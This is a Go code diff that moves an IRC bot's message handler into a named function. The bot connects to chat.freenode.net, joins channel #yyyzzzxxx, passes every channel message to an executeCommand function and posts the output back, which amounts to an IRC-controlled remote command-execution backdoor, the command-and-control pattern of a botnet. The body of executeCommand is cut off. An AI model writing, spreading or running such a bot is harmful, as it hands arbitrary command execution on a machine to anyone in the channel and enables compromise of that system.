@@ -15,25 +15,27 @@ func main() {
 		Pass: "password",
 		User: "username",
 		Name: "Full Name",
-		Handler: irc.HandlerFunc(func(c *irc.Client, m *irc.Message) {
-			if m.Command == "001" {
-				c.Write("JOIN #yyyzzzxxx")
-			} else if m.Command == "PRIVMSG" && c.FromChannel(m) {
-				c.WriteMessage(&irc.Message{
-					Command: "PRIVMSG",
-					Params: []string{
-						m.Params[0], // channel/user name
-						executeCommand(m.Params[1]),
-					},
-				})
-			}
-		}),
+		Handler: irc.HandlerFunc(handler),
 	}
 
 	go connect("chat.freenode.net:6667", config)
 
 	// hax
 	fmt.Println("Whoa!"); select{}
+}
+
+func handler(c *irc.Client, m *irc.Message) {
+	if m.Command == "001" {
+		c.Write("JOIN #yyyzzzxxx")
+	} else if m.Command == "PRIVMSG" && c.FromChannel(m) {
+		c.WriteMessage(&irc.Message{
+			Command: "PRIVMSG",
+			Params: []string{
+				m.Params[0], // channel/user name
+				executeCommand(m.Params[1]),
+			},
+		})
+	}
 }
 
 func executeCommand(input string) string {
